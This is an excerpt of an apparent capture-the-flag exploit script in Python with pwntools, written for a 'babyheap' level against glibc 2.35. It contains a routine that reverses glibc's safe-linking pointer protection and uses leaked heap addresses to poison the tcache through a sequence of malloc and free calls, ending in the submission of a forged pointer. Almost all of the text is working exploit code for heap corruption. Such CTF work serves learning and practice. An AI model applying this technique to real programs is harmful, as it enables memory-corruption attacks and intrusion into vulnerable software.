...
def safe_link_deobf(encrypted: int):
    addr_length = 48 # typical addr size
    mask = 0xfff << addr_length - 12
        
    decrypted = encrypted & mask
    while mask: 
        mask = mask >> 12
        cipher = mask & (decrypted >> 12)
        echonk = mask & encrypted
        decrypted = decrypted | (echonk ^ cipher)
...
def level16(p):
    ...
    for _ in range(4):
        addr = p.recvline()
    addr = addr.split(b' ')[1].strip()
    eaddr = u64(addr.ljust(8, b'\x00'))
    print(hex(eaddr))
    daddr = safe_link_deobf(eaddr)
    print(hex(daddr))
    tcache_addr = daddr ^ daddr >> 12
    print(hex(tcache_addr))
    obf_target = secret ^ daddr >> 12
    scanf_id(p, p64(obf_target), b'0')
    malloc_id(p, b'0', b'16')
    malloc_id(p, b'0', b'16')
    malloc_id(p, b'0', b'16')
    free_id(p, b'0')
    ...
    for _ in range(4):
        addr = p.recvline()
    addr = u64(addr.split(b' ')[1].strip()[:8])
    addr = addr ^ (daddr >> 12)
    addr = addr ^ (secret >> 12)
    send_flag(p, p64(addr))
...
#p = process(['./ld-2.35.so', '--preload', './libc.so.6', './babyheap_level16.0'])
